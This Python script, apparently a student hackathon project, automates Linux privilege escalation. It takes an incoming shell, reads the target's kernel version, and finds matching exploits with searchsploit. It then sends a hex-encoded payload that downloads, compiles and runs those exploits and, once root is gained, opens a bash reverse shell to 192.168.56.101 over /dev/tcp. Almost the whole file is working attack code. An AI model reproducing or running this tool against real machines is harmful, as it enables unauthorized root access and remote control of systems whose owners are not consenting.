import socket
import os
import re
import json
import base64
import threading
import http.server
import time
import binascii
import sys


def welcome():
    print(" /$$                                                                  ")
    print("| $$                                                                  ")
    print("| $$        /$$$$$$   /$$$$$$   /$$$$$$$  /$$$$$$   /$$$$$$  /$$$$$$$ ")
    print("| $$       |____  $$ /$$__  $$ /$$_____/ /$$__  $$ /$$__  $$| $$__  $$")
    print("| $$        /$$$$$$$| $$  \ $$| $$      | $$  \ $$| $$  \ $$| $$  \ $$")
    print("| $$       /$$__  $$| $$  | $$| $$      | $$  | $$| $$  | $$| $$  | $$")
    print("| $$$$$$$$|  $$$$$$$|  $$$$$$/|  $$$$$$$|  $$$$$$/|  $$$$$$/| $$  | $$")
    print("|________/ \_______/ \______/  \_______/ \______/  \______/ |__/  |__/\n\n")

    print(" /$$   /$$                     /$$           /$$$$$$     /$$      /$$ /$$$$$$$  /$$$$$$ ")
    print("| $$  | $$                    | $$         /$$$__  $$$  | $$  /$ | $$| $$__  $$|_  $$_/ ")
    print("| $$  | $$  /$$$$$$   /$$$$$$$| $$   /$$  /$$_/  \_  $$ | $$ /$$$| $$| $$  \ $$  | $$   ")
    print("| $$$$$$$$ |____  $$ /$$_____/| $$  /$$/ /$$/ /$$$$$  $$| $$/$$ $$ $$| $$$$$$$/  | $$   ")
    print("| $$__  $$  /$$$$$$$| $$      | $$$$$$/ | $$ /$$  $$| $$| $$$$_  $$$$| $$____/   | $$   ")
    print("| $$  | $$ /$$__  $$| $$      | $$_  $$ | $$| $$\ $$| $$| $$$/ \  $$$| $$        | $$   ")
    print("| $$  | $$|  $$$$$$$|  $$$$$$$| $$ \  $$| $$|  $$$$$$$$/| $$/   \  $$| $$       /$$$$$$ ")
    print("|__/  |__/ \_______/ \_______/|__/  \__/|  $$\________/ |__/     \__/|__/      |______/ ")
    print("	                                 \  $$$   /$$$                                   ")
    print("  	                                   _  $$$$$$_/                                   ")
    print("    	                                   \______/                                     ")
    print("\n\n\t\t\t\t Developed by Jake and Declan, WPI 2023\n")


# This is the code to be sent to the remote
remote_command = '''
import os
import time
import re
import sys
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect(("192.168.56.101".encode('utf-8'), 1337))

sys.stdout = s.makefile('w')

os.popen(u"wget -r http://192.168.56.101:8080").read()
time.sleep(1)
output = os.popen(u"ls 192.168.56.101:8080").read()
files = output.split(u"\\n")
for file in files:
    print file
    if not file.endswith(u".c"):
        continue
    compiled_filename = file.strip(u".c")
    os.popen(u"gcc 192.168.56.101:8080/" + file + u" -lcrypt -m32 -o " + compiled_filename).read()
    os.popen(u"chmod +x " + compiled_filename).read()
    os.popen(u"./"+compiled_filename).read()

    id_code = os.popen(u"id").read()

    if id_code.startswith('uid=0'):
        os.popen(u"bash -i >& /dev/tcp/192.168.56.101/443 0>&1").read()
        while 1:
            pass

'''


def convert_to_hex(string):
    temp = ""
    val = str(binascii.b2a_hex(string.encode('utf-8')))[2:-1]
    for n in range(0, len(val)):
        if n % 2 == 0:
            temp += "\\\\x"
        temp += val[n:n + 1]
    return temp


def root_listener():
    final = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    host = "0.0.0.0"
    port = 1337

    final.bind((host, port))
    final.listen(1)

    print("[Hack@WPI] Listening for root! ")
    connection, address = final.accept()
    print("[Hack@WPI] Connection Established!")

    print("[Hack@WPI] Success! File Created in root directory! ")


def webserver_listener():
    port = 8080
    handler = http.server.SimpleHTTPRequestHandler

    httpd = http.server.HTTPServer(("", port), handler)
    httpd.serve_forever()


def parse_version(kernel_version):
    pattern = " \\d\\.\\d"
    print(kernel_version)
    data = re.search(pattern, kernel_version)
    print(data[0])
    # The first element of this should be the kernel version
    return data[0]


def start_webserver(file_paths):
    print("[Hack@WPI] Starting Webserver...")
    working_directory = os.popen("pwd").read()

    for path in file_paths:
        print(path)
        os.popen("cp " + path + " " + working_directory).read()
        # os.popen("cp /usr/share/exploitdb/exploits/linux_x86/local/9542.c " + working_directory)
    print("[Hack@WPI] Copied Exploit Files to webroot! ")

    print("[Hack@WPI] Created Socket for 2nd listener! ")
    root_thread = threading.Thread(target=root_listener)
    root_thread.start()

    web_thread = threading.Thread(target=webserver_listener)
    web_thread.start()


def parse_searchsploit_output(possible_exploits,
                              version):  # parse possible exploits for reliable exploits and get paths to host

    print("Version: " + version)
    version = version.replace(".", "\\.")  # Maybe?
    pattern = "\\w*(?<![\\d\\.])" + version  # Look for "2.4.* NOT *.2.4"

    # Look through JSON, iterate through each Title field, parse version.
    search_json = json.loads(possible_exploits)
    print("[Hack@WPI] Loaded JSON of exploit data! ")
    search_json = search_json["RESULTS_EXPLOIT"]

    exploit_paths = []

    for exploit in search_json:
        title = exploit["Title"]
        results = re.findall(pattern, title)

        if len(results) != 0:
            print("[Hack@WPI] Found Exploit for kernel version!")
            path = exploit["Path"]
            exploit_paths.append(path)

    start_webserver(exploit_paths)


def exploit_lookup(parsed_data, version):
    command = "searchsploit " + parsed_data + " -j"
    print("[Hack@WPI] Looking Up exploits...")

    possible_exploits = os.popen(command).read()
    print("[Hack@WPI] Got Possible Exploits...")
    parse_searchsploit_output(possible_exploits, version)


def please_work():
    os.system("nc -lnvp 443")


def start_listener():
    host = "0.0.0.0"
    port = int(input("[Hack@WPI] Enter the port to listen on: "))
    command = "uname -a > 'file.txt'\n"

    socket_listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    socket_listener.bind((host, port))
    socket_listener.listen(5)  # allow up to 5 connections

    conn, addr = socket_listener.accept()

    with conn:
        print("[Hack@WPI] Connection from: ", addr)

        conn.sendall("cd /tmp\n".encode('utf-8'))
        time.sleep(1)
        conn.sendall(command.encode('utf-8'))
        time.sleep(1)
        comm2 = "cat file.txt\n"

        conn.sendall(comm2.encode('utf-8'))
        time.sleep(2)
        test = conn.recv(4096).decode('utf-8')

        print(test)

        test_split = test.split("\n")
        kernel_version = test

        '''
        for string in test_split:
            if string.startswith("Linux "):
                kernel_version = string
                break
        print(kernel_version)
        '''

        parsed_data = parse_version(kernel_version)
        print("[Hack@WPI] Parsed Kernel Version from uname -a...")
        search_params = "Linux Kernel " + parsed_data
        exploit_lookup(search_params, parsed_data)

        ip = socket.gethostbyname(socket.gethostname())

        wget_command = "wget -r http://" + ip + " /tmp\n"
        conn.sendall(wget_command.encode('utf-8'))
        time.sleep(10)

        ls_command = "cd /tmp\n"
        conn.sendall(ls_command.encode('utf-8'))
        time.sleep(1)

        print("[Hack@WPI] Sending commands to run exploit...")

        remote_encoded = convert_to_hex(remote_command)
        print("[Hack@WPI] Converted payload to hex")

        send_command = "echo -e " + remote_encoded + " |cat > script.py\n"
        conn.sendall(send_command.encode('utf-8'))
        time.sleep(5)

        second_command = "python script.py\n"
        conn.sendall(second_command.encode('utf-8'))
        time.sleep(10)

        nc_thread = threading.Thread(target=please_work)
        nc_thread.start()
        time.sleep(1)

        # conn.sendall("bash -i >& /dev/tcp/192.168.56.101/443 0>&1".encode('utf-8'))


# main function
def main():
    welcome()
    start_listener()


if __name__ == '__main__':
    main()
